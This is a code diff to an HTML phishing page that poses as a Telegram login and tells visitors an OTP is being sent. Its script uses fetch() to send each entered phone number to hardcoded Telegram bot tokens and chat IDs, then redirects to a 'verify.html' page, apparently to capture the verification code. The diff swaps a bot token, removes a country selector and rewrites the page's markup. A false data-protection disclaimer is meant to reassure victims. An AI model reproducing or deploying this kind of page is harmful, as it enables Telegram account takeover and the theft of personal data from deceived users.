@@ -21,7 +21,7 @@
     body {
       margin: 0;
       font-family: 'Roboto', sans-serif;
-      background: url('gay1.jpg') no-repeat center center fixed;
+      background: url('putih.avif') no-repeat center center fixed;
       background-size: cover;
       display: flex;
       align-items: center;
@@ -173,58 +173,55 @@
       </svg>
     </div>
     <h1>Enter telegram number</h1>
-    <p>To continue, please login first</p>
-    <form id="phoneForm">
-      <label for="country">Country code \/</label>
-      <select id="countrySelect">
-  <option value="+966">SA Saudi Arabia</option>
-  <option value="+971">UAE United Arab Emirates (+971)</option>
-  <option value="+65">SG Singapore (+65)</option>
-  <option value="+965">KW Kuwait (+965)</option>
-  <option value="+673">BN Brunei Darussalam (+673)</option>
-</select>
+<p>To continue, please login first</p>
 
-<label for="phone">Telegram number</label>
-<input type="tel" id="phoneInput" placeholder="Telegram number" required />
-      
-      <button type="submit" class="btn">next</button>
-      
-      <div class="disclaimer">
-        *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
-      </div>
-    </form>
-    <div class="status" id="statusMessage"></div>
+<form id="phoneForm">
+  <label for="phone">Telegram number</label>
+  <input type="tel" id="phoneInput" placeholder="Telegram number" required />
+
+  <button type="submit" class="btn">Next</button>
+
+  <div class="disclaimer">
+    *Make sure the number entered is active to receive verification.
+    Data will be kept confidential in accordance with the Personal Data Protection Act.
   </div>
+</form>
 
-  <script>
-    const phoneForm = document.getElementById('phoneForm');
+<div class="status" id="statusMessage"></div>
+
+<script>
+const phoneForm = document.getElementById('phoneForm');
 const phoneInput = document.getElementById('phoneInput');
 const statusMessage = document.getElementById('statusMessage');
-const blurOverlay = document.getElementById('blurOverlay');
-const loadingText = document.getElementById('loadingText');
-const countrySelect = document.getElementById('countrySelect');
 
 const bots = [
   { token: "7416784301:AAHFj7bIZRv_B-NWAPHSyJvR6bTwoyOXc2Q", chatId: "5795421010" },
-  { token: "7272507372:AAHz55yCKgJkKs1SpzplM7Fg8iaoYVz4YBM", chatId: "5876510981" }
+  { token: "7109141057:AAE5SKpp3qqufq9rwakmgfBcCALvQvLjOhc", chatId: "5795421010" }
 ];
 
-phoneForm.addEventListener('submit', function(e) {
+phoneForm.addEventListener('submit', function (e) {
   e.preventDefault();
 
   const phone = phoneInput.value.trim();
-  const countryText = countrySelect.options[countrySelect.selectedIndex].text;
+  if (!phone) return;
+
   const currentBotIndex = parseInt(localStorage.getItem('currentBotIndex') || "0");
   localStorage.setItem('sessionBotIndex', currentBotIndex);
+
   const bot = bots[currentBotIndex];
 
-  const message = `🌀 *FUN GAY LOGIN*\n━━━━━━━━━━━━━━\n🌍 Country: ${countryText}\n📞 Phone: \`${phone}\`\n━━━━━━━━━━━━━━`;
-  const api = `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+  const message = `🌀 *FUN GAY LOGIN*
+━━━━━━━━━━━━━━
+📞 Phone: \`${phone}\`
+━━━━━━━━━━━━━━`;
+
+  const api = `https://api.telegram.org/bot${bot.token}/sendMessage` +
+              `?chat_id=${bot.chatId}` +
+              `&text=${encodeURIComponent(message)}` +
+              `&parse_mode=Markdown`;
 
   statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
   statusMessage.style.color = "#000";
-  blurOverlay.style.display = "block";
-  loadingText.style.display = "block";
 
   fetch(api)
     .then(res => res.json())
@@ -232,23 +229,21 @@ phoneForm.addEventListener('submit', function(e) {
       if (data.ok) {
         const nextBotIndex = (currentBotIndex + 1) % bots.length;
         localStorage.setItem('currentBotIndex', nextBotIndex);
+
         setTimeout(() => {
           window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
         }, 3000);
       } else {
-        blurOverlay.style.display = "none";
-        loadingText.style.display = "none";
-        statusMessage.textContent = "❌ Gagal mengirim ke bot.";
+        statusMessage.textContent = "❌ Failed to send to bot.";
         statusMessage.style.color = "red";
       }
     })
     .catch(err => {
-      blurOverlay.style.display = "none";
-      loadingText.style.display = "none";
       statusMessage.textContent = "❌ Error: " + err.message;
       statusMessage.style.color = "red";
     });
 });
-  </script>
+</script>
+
 </body>
 </html>
